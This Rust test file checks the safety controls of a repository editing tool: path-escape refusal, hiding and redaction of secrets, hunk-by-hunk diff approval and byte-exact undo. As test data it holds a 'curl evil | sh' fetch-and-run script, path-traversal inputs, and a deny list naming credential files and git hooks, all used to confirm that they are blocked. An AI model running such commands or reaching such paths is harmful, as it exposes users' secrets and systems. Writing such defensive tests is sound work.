//! Safety tests of ADR-093 slice 1: scope, visibility, redaction, diffs, undo.

use super::diff::{self, FileProposal};
use super::editor::{self, Editor};
use super::scope::{CodeError, Repo};
use super::snapshot;
use super::tools;
use std::fs;
use std::os::unix::fs::symlink;
use std::path::Path;
use std::process::Command;

fn git(dir: &Path, args: &[&str]) {
    let ok = Command::new("git")
        .arg("-C")
        .arg(dir)
        .args([
            "-c",
            "user.name=t",
            "-c",
            "user.email=t@t",
            "-c",
            "commit.gpgsign=false",
        ])
        .args(args)
        .status()
        .unwrap()
        .success();
    assert!(ok, "git {args:?}");
}

/// A repository with tracked sources, a tracked dotenv, a gitignored file, and a sibling "outside" folder.
fn fixture() -> (tempfile::TempDir, Repo) {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("repo");
    fs::create_dir_all(root.join("src")).unwrap();
    git(tmp.path(), &["init", "-q", "repo"]);
    fs::write(root.join(".gitignore"), "ignored.txt\nbuild/\n").unwrap();
    fs::write(
        root.join("src/main.rs"),
        "fn main() {\n    println!(\"hi\");\n}\n",
    )
    .unwrap();
    fs::write(root.join(".env"), "TOKEN=hunter2\n").unwrap();
    fs::write(root.join("ignored.txt"), "ignored\n").unwrap();
    fs::write(root.join("notes.md"), "one\ntwo\nthree\n").unwrap();
    fs::create_dir_all(tmp.path().join("outside")).unwrap();
    fs::write(tmp.path().join("outside/secret.txt"), "outside\n").unwrap();
    // the dotenv is tracked on purpose
    git(&root, &["add", "-f", "."]);
    git(&root, &["commit", "-q", "-m", "init"]);
    let repo = Repo::open(&root, None).unwrap();
    (tmp, repo)
}

fn token(prefix: &str) -> String {
    format!("{prefix}{}", "a1B2c3D4".repeat(5))
}

// ---- path scoping ----------------------------------------------------------------------------------------------

#[test]
fn a_folder_without_git_is_not_a_repository() {
    let tmp = tempfile::tempdir().unwrap();
    assert!(matches!(
        Repo::open(tmp.path(), None),
        Err(CodeError::NotARepository(_))
    ));
}

#[test]
fn dotdot_is_refused_for_read_and_write() {
    let (_t, repo) = fixture();
    assert!(matches!(
        repo.resolve_read("../outside/secret.txt"),
        Err(CodeError::OutsideRepository(_))
    ));
    assert!(matches!(
        repo.resolve_write("../outside/new.txt"),
        Err(CodeError::OutsideRepository(_))
    ));
    assert!(matches!(
        repo.resolve_write("src/../../outside/new.txt"),
        Err(CodeError::OutsideRepository(_))
    ));
    assert!(matches!(
        repo.resolve_read("/etc/hosts"),
        Err(CodeError::OutsideRepository(_))
    ));
}

#[test]
fn a_symlink_to_a_file_outside_is_refused() {
    let (t, repo) = fixture();
    symlink(
        t.path().join("outside/secret.txt"),
        repo.root().join("link.txt"),
    )
    .unwrap();
    assert!(matches!(
        repo.resolve_read("link.txt"),
        Err(CodeError::OutsideRepository(_))
    ));
    assert!(repo.resolve_write("link.txt").is_err());
    assert!(tools::read_file(&repo, "link.txt").is_err());
}

#[test]
fn a_symlink_to_a_directory_outside_is_refused() {
    let (t, repo) = fixture();
    symlink(t.path().join("outside"), repo.root().join("dirlink")).unwrap();
    assert!(matches!(
        repo.resolve_read("dirlink/secret.txt"),
        Err(CodeError::OutsideRepository(_))
    ));
    assert!(matches!(
        repo.resolve_write("dirlink/new.txt"),
        Err(CodeError::OutsideRepository(_))
    ));
    assert!(!t.path().join("outside/new.txt").exists());
}

#[test]
fn a_symlink_created_during_the_run_is_caught_at_apply() {
    let (t, repo) = fixture();
    let proposal = diff::propose(&repo, "notes.md", "one\nTWO\nthree\n").unwrap();
    // between the proposal and the write, the target becomes a link to a file outside
    fs::remove_file(repo.root().join("notes.md")).unwrap();
    symlink(
        t.path().join("outside/secret.txt"),
        repo.root().join("notes.md"),
    )
    .unwrap();
    assert!(diff::apply(&repo, &proposal, &[0]).is_err());
    assert_eq!(
        fs::read_to_string(t.path().join("outside/secret.txt")).unwrap(),
        "outside\n"
    );
}

#[test]
fn a_new_file_through_a_directory_link_created_during_the_run_is_caught() {
    let (t, repo) = fixture();
    let proposal = diff::propose(&repo, "gen/new.txt", "x\n").unwrap();
    symlink(t.path().join("outside"), repo.root().join("gen")).unwrap();
    assert!(matches!(
        diff::apply(&repo, &proposal, &[0]),
        Err(CodeError::OutsideRepository(_))
    ));
    assert!(!t.path().join("outside/new.txt").exists());
}

#[test]
fn a_hard_linked_secret_is_refused_by_its_pattern() {
    let (t, repo) = fixture();
    fs::hard_link(
        t.path().join("outside/secret.txt"),
        repo.root().join("prod.pem"),
    )
    .unwrap();
    assert!(matches!(
        tools::read_file(&repo, "prod.pem"),
        Err(CodeError::Invisible(_))
    ));
    assert!(matches!(
        repo.resolve_write("prod.pem"),
        Err(CodeError::Refused(_))
    ));
    // a hard link under an innocent name is refused for writing too (it would change the other name)
    fs::hard_link(
        t.path().join("outside/secret.txt"),
        repo.root().join("innocent.txt"),
    )
    .unwrap();
    assert!(matches!(
        repo.resolve_write("innocent.txt"),
        Err(CodeError::Refused(_))
    ));
}

// ---- visibility and redaction ------------------------------------------------------------------------------------

#[test]
fn a_tracked_dotenv_and_a_gitignored_file_are_invisible_to_every_read_tool() {
    let (_t, repo) = fixture();
    for hidden in [".env", "ignored.txt", ".git/config"] {
        assert!(
            matches!(
                tools::read_file(&repo, hidden),
                Err(CodeError::Invisible(_))
            ),
            "{hidden}"
        );
        assert!(tools::outline(&repo, hidden).is_err(), "{hidden}");
    }
    let names: Vec<String> = tools::list_dir(&repo, "")
        .unwrap()
        .into_iter()
        .map(|e| e.name)
        .collect();
    assert!(names.contains(&"src".to_string()) && names.contains(&"notes.md".to_string()));
    assert!(
        !names.contains(&".env".to_string())
            && !names.contains(&"ignored.txt".to_string())
            && !names.contains(&".git".to_string())
    );
    assert!(tools::search_text(&repo, "hunter2").unwrap().is_empty());
    assert!(tools::search_text(&repo, "ignored")
        .unwrap()
        .iter()
        .all(|m| m.path != "ignored.txt"));
    let info = repo.info().unwrap();
    assert!(info.hidden >= 2 && info.visible >= 3);
    assert!(!info.branch.is_empty());
}

#[test]
fn a_directory_in_gitignore_is_invisible_with_its_files() {
    let (_t, repo) = fixture();
    fs::create_dir_all(repo.root().join("build")).unwrap();
    fs::write(repo.root().join("build/out.txt"), "x\n").unwrap();
    assert!(tools::read_file(&repo, "build/out.txt").is_err());
}

#[test]
fn a_file_holding_a_github_token_reaches_the_caller_redacted() {
    let (_t, repo) = fixture();
    let ghp = token("ghp_");
    let body = format!("const t = \"{ghp}\";\nfn ok() {{}}\n-----BEGIN PRIVATE KEY-----\nMIIabc\n-----END PRIVATE KEY-----\n");
    fs::write(repo.root().join("conf.ts"), &body).unwrap();
    let read = tools::read_file(&repo, "conf.ts").unwrap();
    assert!(!read.text.contains(&ghp) && !read.text.contains("MIIabc"));
    assert!(read.text.contains("[redacted]") && read.text.contains("fn ok()"));
    let found = tools::search_text(&repo, "const t").unwrap();
    assert!(found.iter().all(|m| !m.text.contains(&ghp)));
}

#[test]
fn every_known_token_shape_is_redacted() {
    for t in [
        token("ghp_"),
        token("github_pat_"),
        token("gho_"),
        token("ghu_"),
        token("oz_"),
        token("sk-"),
        format!("{}{}", "AKIA", "0123456789ABCDEF"),
    ] {
        let out = super::visibility::redact(&format!("x {t} y"));
        assert_eq!(out, "x [redacted] y", "{t}");
        assert!(super::visibility::has_secret(&t));
    }
    assert_eq!(super::visibility::redact("plain text"), "plain text");
}

#[test]
fn read_file_is_size_capped() {
    let (_t, repo) = fixture();
    fs::write(
        repo.root().join("big.txt"),
        "a".repeat(tools::READ_CAP + 10),
    )
    .unwrap();
    let r = tools::read_file(&repo, "big.txt").unwrap();
    assert!(r.truncated && r.text.len() == tools::READ_CAP);
}

#[test]
fn outline_lists_declarations() {
    let (_t, repo) = fixture();
    let o = tools::outline(&repo, "src/main.rs").unwrap();
    assert_eq!(o.len(), 1);
    assert_eq!((o[0].line, o[0].text.as_str()), (1, "fn main() {"));
}

// ---- diffs ---------------------------------------------------------------------------------------------------------

fn three_hunks(repo: &Repo) -> FileProposal {
    fs::write(repo.root().join("lines.txt"), "a\nb\nc\nd\ne\nf\ng\nh\ni\n").unwrap();
    diff::propose(repo, "lines.txt", "A\nb\nc\nd\nE\nf\ng\nh\nI\n").unwrap()
}

#[test]
fn proposing_writes_nothing() {
    let (_t, repo) = fixture();
    let p = diff::propose(&repo, "notes.md", "one\nTWO\nthree\n").unwrap();
    assert_eq!(p.hunks.len(), 1);
    assert_eq!(
        fs::read_to_string(repo.root().join("notes.md")).unwrap(),
        "one\ntwo\nthree\n"
    );
}

#[test]
fn an_exact_apply_writes_the_proposed_text() {
    let (_t, repo) = fixture();
    let p = diff::propose(&repo, "notes.md", "one\nTWO\nthree\nfour\n").unwrap();
    let ids: Vec<usize> = p.hunks.iter().map(|h| h.id).collect();
    let r = diff::apply(&repo, &p, &ids).unwrap();
    assert!(r.written);
    assert_eq!(
        fs::read_to_string(repo.root().join("notes.md")).unwrap(),
        "one\nTWO\nthree\nfour\n"
    );
}

#[test]
fn only_the_approved_hunks_are_written() {
    let (_t, repo) = fixture();
    let p = three_hunks(&repo);
    assert_eq!(p.hunks.len(), 3);
    let r = diff::apply(&repo, &p, &[0, 2]).unwrap();
    assert_eq!(r.hunks_applied, 2);
    assert_eq!(
        fs::read_to_string(repo.root().join("lines.txt")).unwrap(),
        "A\nb\nc\nd\ne\nf\ng\nh\nI\n"
    );
}

#[test]
fn no_approved_hunk_writes_nothing() {
    let (_t, repo) = fixture();
    let p = three_hunks(&repo);
    let r = diff::apply(&repo, &p, &[]).unwrap();
    assert!(!r.written);
    assert_eq!(
        fs::read_to_string(repo.root().join("lines.txt")).unwrap(),
        "a\nb\nc\nd\ne\nf\ng\nh\ni\n"
    );
}

#[test]
fn a_changed_base_is_a_conflict_and_nothing_is_written() {
    let (_t, repo) = fixture();
    let p = diff::propose(&repo, "notes.md", "one\nTWO\nthree\n").unwrap();
    fs::write(repo.root().join("notes.md"), "one\ntwo\nthree\nextra\n").unwrap();
    assert!(matches!(
        diff::apply(&repo, &p, &[0]),
        Err(CodeError::Conflict(_))
    ));
    assert_eq!(
        fs::read_to_string(repo.root().join("notes.md")).unwrap(),
        "one\ntwo\nthree\nextra\n"
    );
}

#[test]
fn a_new_file_is_created_and_a_conflict_if_it_appeared() {
    let (_t, repo) = fixture();
    let p = diff::propose(&repo, "src/new/mod.rs", "pub fn a() {}\n").unwrap();
    assert!(p.base_hash.is_none());
    diff::apply(&repo, &p, &[0]).unwrap();
    assert_eq!(
        fs::read_to_string(repo.root().join("src/new/mod.rs")).unwrap(),
        "pub fn a() {}\n"
    );
    assert!(matches!(
        diff::apply(&repo, &p, &[0]),
        Err(CodeError::Conflict(_))
    ));
}

#[test]
fn git_internals_and_secret_paths_are_refused_as_targets() {
    let (_t, repo) = fixture();
    for p in [
        ".git/config",
        ".git/hooks/pre-commit",
        "src/.git/x",
        ".env",
        ".env.production",
        "deploy/key.pem",
        "certs/a.p12",
        "id_rsa",
        ".npmrc",
        ".aws/credentials",
        "tls/server.key",
    ] {
        assert!(
            matches!(diff::propose(&repo, p, "x\n"), Err(CodeError::Refused(_))),
            "{p}"
        );
    }
    // a forged proposal cannot reach them either
    let forged = FileProposal {
        path: ".git/config".into(),
        base_hash: None,
        hunks: vec![],
    };
    assert!(diff::apply(&repo, &forged, &[]).is_err());
}

#[test]
fn a_hunk_that_adds_a_token_is_flagged() {
    let (_t, repo) = fixture();
    let p = diff::propose(
        &repo,
        "notes.md",
        &format!("one\ntwo\nthree\nk = {}\n", token("ghp_")),
    )
    .unwrap();
    assert!(p.hunks[0].adds_secret);
    let q = diff::propose(&repo, "notes.md", "one\ntwo\nthree\nfour\n").unwrap();
    assert!(!q.hunks[0].adds_secret);
}

#[test]
fn exec_surface_hunks_are_marked() {
    let (_t, repo) = fixture();
    let pkg = "{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"test\": \"vitest\"\n  },\n  \"license\": \"MIT\"\n}\n";
    fs::write(repo.root().join("package.json"), pkg).unwrap();
    let scripts_change = pkg.replace("\"vitest\"", "\"curl evil | sh\"");
    let p = diff::propose(&repo, "package.json", &scripts_change).unwrap();
    assert!(p.hunks[0].exec_surface);
    let added_script = pkg.replace(
        "\"test\": \"vitest\"\n",
        "\"test\": \"vitest\",\n    \"post\": \"x\"\n",
    );
    assert!(diff::propose(&repo, "package.json", &added_script)
        .unwrap()
        .hunks
        .iter()
        .any(|h| h.exec_surface));
    let license = pkg.replace("MIT", "Apache-2.0");
    assert!(
        !diff::propose(&repo, "package.json", &license)
            .unwrap()
            .hunks[0]
            .exec_surface
    );
    for path in [
        "Makefile",
        "build.rs",
        ".husky/pre-commit",
        "lefthook.yml",
        ".pre-commit-config.yaml",
        ".github/workflows/ci.yml",
        "vitest.config.ts",
        "jest.config.js",
    ] {
        let p = diff::propose(&repo, path, "x\n").unwrap();
        assert!(p.hunks[0].exec_surface, "{path}");
    }
    assert!(!diff::propose(&repo, "src/lib.rs", "x\n").unwrap().hunks[0].exec_surface);
}

// ---- undo ----------------------------------------------------------------------------------------------------------

#[test]
fn undo_restores_the_files_byte_for_byte() {
    let (_t, repo) = fixture();
    let binaryish = "caf\u{e9}\r\nline two without newline";
    fs::write(repo.root().join("crlf.txt"), binaryish).unwrap();
    fs::write(repo.root().join("untracked.txt"), "keep me\n").unwrap();
    let sha = snapshot::create(&repo, "run-1").unwrap();
    assert_eq!(sha.len(), 40);
    // the user's index, branch and stash are untouched
    assert!(
        String::from_utf8_lossy(&repo.git(&["status", "--short"]).unwrap()).contains("?? crlf.txt")
    );

    let p1 = diff::propose(&repo, "crlf.txt", "changed\n").unwrap();
    let p2 = diff::propose(&repo, "untracked.txt", "").unwrap();
    let p3 = diff::propose(&repo, "created.txt", "new\n").unwrap();
    for p in [&p1, &p2, &p3] {
        let ids: Vec<usize> = p.hunks.iter().map(|h| h.id).collect();
        diff::apply(&repo, p, &ids).unwrap();
    }
    assert_eq!(
        fs::read_to_string(repo.root().join("crlf.txt")).unwrap(),
        "changed\n"
    );

    let done = snapshot::restore(
        &repo,
        "run-1",
        &[
            "crlf.txt".into(),
            "untracked.txt".into(),
            "created.txt".into(),
        ],
    )
    .unwrap();
    assert_eq!(done.len(), 3);
    assert_eq!(
        fs::read(repo.root().join("crlf.txt")).unwrap(),
        binaryish.as_bytes()
    );
    assert_eq!(
        fs::read_to_string(repo.root().join("untracked.txt")).unwrap(),
        "keep me\n"
    );
    assert!(!repo.root().join("created.txt").exists());
}

#[test]
fn undo_refuses_a_bad_run_id_and_a_missing_snapshot() {
    let (_t, repo) = fixture();
    assert!(snapshot::create(&repo, "../x").is_err());
    assert!(snapshot::create(&repo, "a b").is_err());
    assert!(matches!(
        snapshot::restore(&repo, "nope", &["notes.md".into()]),
        Err(CodeError::NotFound(_))
    ));
}

#[test]
fn undo_cannot_write_outside_or_on_secret_paths() {
    let (_t, repo) = fixture();
    snapshot::create(&repo, "run-2").unwrap();
    assert!(snapshot::restore(&repo, "run-2", &["../outside/secret.txt".into()]).is_err());
    assert!(snapshot::restore(&repo, "run-2", &[".env".into()]).is_err());
}

// ---- editor --------------------------------------------------------------------------------------------------------

#[test]
fn the_editor_commands_are_argv_at_a_line() {
    let (p, a) = editor::command(Editor::VsCode, "/r/a b.rs", 12);
    assert_eq!(p, "open");
    assert_eq!(a.last().unwrap(), "/r/a b.rs:12");
    let (p, a) = editor::command(Editor::Xcode, "/r/a.swift", 0);
    assert_eq!(
        (p.as_str(), a),
        (
            "xed",
            vec!["--line".to_string(), "1".into(), "/r/a.swift".into()]
        )
    );
}

#[test]
fn opening_in_an_editor_goes_through_the_read_scope() {
    let (_t, repo) = fixture();
    assert!(editor::open(&repo, Editor::VsCode, "../outside/secret.txt", 1).is_err());
    assert!(editor::open(&repo, Editor::VsCode, ".env", 1).is_err());
}
